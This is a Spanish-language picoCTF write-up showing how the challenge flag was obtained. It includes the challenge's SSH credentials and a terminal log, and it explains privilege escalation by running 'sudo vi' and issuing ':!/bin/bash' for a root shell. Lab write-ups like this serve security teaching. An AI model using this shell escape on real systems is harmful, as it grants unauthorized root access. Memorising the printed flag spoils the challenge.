# DESCRIPCIÓN:
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 55759 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `33qE7mB5BF`

Can you login and read the root file?
# SOLUCIÓN:
#### picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```
PS C:\Users\Usuario> wsl
mony@Mony:/mnt/c/Users/Usuario$ ssh -p 57070 picoplayer@saturn.picoctf.net
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
picoplayer@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Aug 31 16:20:35 2026 from 187.207.172.219
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

[1]+  Stopped                 sudo vi
picoplayer@challenge:~$ sudo vi

root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
root@challenge:/home/picoplayer# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
mony@Mony:/mnt/c/Users/Usuario$
```

Me conecté al servidor por ssh y usé `sudo -l` para revisar mis permisos; ahí me di cuenta de que podía ejecutar el editor `vi` como root.

Después (que es lo que no sale en la captura), abrí el editor con `sudo vi` y metí el comando `:!/bin/bash` para forzar la salida a una terminal, pero conservando los permisos de administrador.

Ya por último, estando como root, nada más ejecuté `cat /root/.flag.txt` para leer el archivo y obtener la bandera.
# NOTAS ADICIONALES:
sudo vi: Abre el editor de texto, pero ejecutándolo con permisos máximos de administrador (root).

:!/bin/bash: Es una función de `vi` que te permite ejecutar comandos del sistema sin cerrar el programa. Al pedirle /bin/bash, le estás diciendo que abra una terminal.

El truco (Escalada de privilegios): Como el editor vi estaba corriendo como administrador, la nueva terminal que abre hereda esos mismos permisos. Así es como pasas de ser un usuario normal a tener el control total para leer lo que sea.


# REFERENCIAS:
https://webshell.cylabacademy.org/